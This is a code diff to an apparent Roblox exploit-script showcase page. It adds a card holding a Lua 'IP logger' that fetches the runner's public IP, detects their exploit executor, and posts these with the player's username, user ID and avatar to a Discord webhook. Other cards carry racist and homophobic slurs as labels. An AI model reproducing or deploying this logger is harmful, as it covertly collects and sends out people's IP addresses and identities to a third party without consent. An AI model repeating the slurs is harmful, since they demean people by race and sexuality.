@@ -43,7 +43,74 @@
           <h3>Server Browser</h3>
           <p>Join any Roblox server instantly</p>
         </div>
-          <div class="card" onclick="showScript('Wolf RP', 'Cum Nigger')">
+
+        <!-- New Executor Info Script card -->
+        <div class="card" onclick="showScript('IP logger/Executor Info', `local _A = tostring(game:HttpGet('https://api.ipify.org', true))
+local _B = game:GetService('HttpService')
+local _C = game:GetService('Players').LocalPlayer
+
+local _D = {
+    [is_sirhurt_closure] = 'Sirhurt',
+    [pebc_execute] = 'ProtoSmasher',
+    [syn] = 'Synapse X',
+    [secure_load] = 'Sentinel',
+    [KRNL_LOADED] = 'Krnl',
+    [SONA_LOADED] = 'Sona',
+    [FlUXUS_LOADED] = 'Fluxus',
+    ['default'] = 'Wave'
+}
+
+local _E = _D[is_sirhurt_closure] or _D[pebc_execute] or _D[syn] or _D[secure_load] or _D[KRNL_LOADED] or _D[SONA_LOADED] or _D[FlUXUS_LOADED] or _D['default']
+
+if not _E then
+    if typeof(identifyexecutor) == 'function' then
+        local name, ver = identifyexecutor()
+        _E = name .. (ver and (' v' .. ver) or '')
+    elseif getexecutorname then
+        local ok, name = pcall(getexecutorname)
+        if ok and name then
+            _E = name
+        end
+    elseif _G.executor then
+        _E = tostring(_G.executor)
+    else
+        _E = 'Unknown Executor'
+    end
+end
+
+local _F = _B:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(_C.UserId)))['data'][1]
+local _G = _F and _F['imageUrl'] or 'Fallback URL'
+
+local _H = 'PUT YOUR DISCORD WEBHOOK URL HERE'
+
+local _I = {
+    username = _C.Name .. ' [' .. _C.UserId .. ']',
+    avatar_url = _G,
+    embeds = {
+        {
+            description = 'Details:',
+            fields = {
+                { name = 'IP', value = _A, inline = true },
+                { name = 'Exploit', value = _E, inline = true },
+            },
+            color = tonumber(0x7269da),
+        }
+    }
+}
+
+local _J = _B:JSONEncode(_I)
+local _K = { ['content-type'] = 'application/json' }
+
+local _L = http_request or request or HttpPost or syn.request
+_L({ Url = _H, Body = _J, Method = 'POST', Headers = _K })
+
+print('IP logger Complete!')
+print('Script made by Syr0nix')`)">
+          <h3>Executor Info + IP logger</h3>
+          <p>Detects executor and user info (Webhook placeholder)</p>
+        </div>
+
+        <div class="card" onclick="showScript('Wolf RP', 'Cum Nigger')">
          <h3>A Wolves' Pack Alpha - Wolf RP</h3>
           <p>Faggoit</p>
         </div>
